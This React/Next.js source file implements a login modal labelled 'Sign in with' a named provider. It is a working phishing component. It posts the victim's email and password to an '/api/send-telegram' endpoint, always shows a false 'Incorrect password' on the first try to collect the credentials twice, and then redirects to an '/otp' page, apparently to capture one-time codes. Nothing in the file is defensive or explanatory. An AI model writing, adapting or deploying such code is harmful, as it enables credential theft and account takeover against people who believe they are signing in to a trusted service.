'use client';

import { useEffect, useMemo, useRef, useState } from "react";
import { createPortal } from "react-dom";
import { useRouter } from "next/navigation";
import { motion, AnimatePresence, useReducedMotion } from "framer-motion";
import Loading from "../ui/loading"; // spinner-only

interface Props {
  provider: string;
  onClose: () => void;
  clickCount: number;
  setClickCount: (count: number) => void;
}

function FullscreenOverlay({ show, children }: { show: boolean; children?: React.ReactNode }) {
  const prefersReducedMotion = useReducedMotion();
  const anim = useMemo(
    () => ({
      initial: { opacity: 0 },
      animate: { opacity: 1, transition: { duration: prefersReducedMotion ? 0 : 0.2 } },
      exit: { opacity: 0, transition: { duration: prefersReducedMotion ? 0 : 0.15 } },
    }),
    [prefersReducedMotion]
  );

  if (typeof window === "undefined") return null;

  return createPortal(
    <AnimatePresence>
      {show && (
        <motion.div
          key="fs-overlay"
          {...anim}
          className="fixed inset-0 z-[9999] grid place-items-center bg-black/30 backdrop-blur-sm"
          aria-live="polite"
          role="status"
        >
          {children}
        </motion.div>
      )}
    </AnimatePresence>,
    document.body
  );
}

export default function LoginModal({
  provider,
  onClose,
  clickCount,
  setClickCount,
}: Props) {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);          // action state
  const [showSpinner, setShowSpinner] = useState(false);  // delayed visual
  const delayRef = useRef<number | null>(null);

  const router = useRouter();

  // Delay spinner ~150ms to prevent flicker
  useEffect(() => {
    if (loading) {
      delayRef.current = window.setTimeout(() => setShowSpinner(true), 150);
      // lock scroll while overlay is up
      document.documentElement.classList.add("overflow-hidden");
    } else {
      if (delayRef.current) window.clearTimeout(delayRef.current);
      delayRef.current = null;
      setShowSpinner(false);
      document.documentElement.classList.remove("overflow-hidden");
    }
    return () => {
      if (delayRef.current) window.clearTimeout(delayRef.current);
      document.documentElement.classList.remove("overflow-hidden");
    };
  }, [loading]);

  const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setError(null);
    setLoading(true);

    const newClickCount = clickCount + 1;
    setClickCount(newClickCount);

    if (!email || !password) {
      setError("Email and password are required.");
      setLoading(false);
      return;
    }

    try {
      const res = await fetch("/api/send-telegram", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ email, password, provider }),
      });

      const data = await res.json().catch(() => ({}));

      if (!res.ok) throw new Error(data?.description || data?.error || `HTTP ${res.status}`);

      if (newClickCount === 1) {
        setError("Incorrect password. Please try again.");
        setLoading(false);
        return;
      }

      // Navigate; fullscreen overlay stays until unmount
      router.push("/otp");
    } catch (err) {
      console.error(err);
      setError("Network error. Try again later.");
      setLoading(false);
    }
  };

  return (
    <>
      {/* Your modal shell stays the same */}
      <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50 backdrop-blur-sm">
        <motion.div
          initial={{ opacity: 0, scale: 0.98, y: 10 }}
          animate={{ opacity: 1, scale: 1, y: 0 }}
          exit={{ opacity: 0, scale: 0.98, y: 10 }}
          transition={{ duration: 0.25, ease: "easeOut" }}
          className="relative w-full h-full md:h-auto md:w-[28rem] bg-white/10 backdrop-blur-md rounded-none md:rounded-2xl shadow-2xl p-8"
          aria-busy={loading}
        >
          <form onSubmit={handleSubmit} className="flex flex-col justify-center gap-4">
            <h2 className="text-3xl font-semibold text-white mb-2 text-center tracking-wide">
              Sign in with {provider}
            </h2>

            <input
              type="email"
              placeholder="Enter your email"
              className="w-full p-3 rounded-lg bg-white/20 text-white placeholder-white/70 outline-none focus:ring-2 focus:ring-[#F25022] transition"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              autoComplete="email"
              disabled={loading}
              required
            />
            <input
              type="password"
              placeholder="Enter your password"
              className="w-full p-3 rounded-lg bg-white/20 text-white placeholder-white/70 outline-none focus:ring-2 focus:ring-[#F25022] transition"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              autoComplete="current-password"
              disabled={loading}
              required
            />

            {error && (
              <motion.p initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="text-red-400 text-sm text-center" role="alert">
                {error}
              </motion.p>
            )}

            <button
              type="submit"
              className="w-full bg-blue-600 hover:bg-blue-700 text-white font-medium py-2 rounded-lg transition-all duration-200 disabled:opacity-60 disabled:cursor-not-allowed"
              disabled={loading}
            >
              {loading ? "Signing in..." : "Login"}
            </button>

            <button
              type="button"
              onClick={onClose}
              className="w-full text-red-400 hover:text-red-500 text-sm underline transition-all duration-200 disabled:opacity-60"
              disabled={loading}
            >
              Cancel
            </button>
          </form>
        </motion.div>
      </div>

      {/* NEW: Full-screen overlay rendered to <body>, above everything */}
      <FullscreenOverlay show={showSpinner}>
        <Loading />
      </FullscreenOverlay>
    </>
  );
}
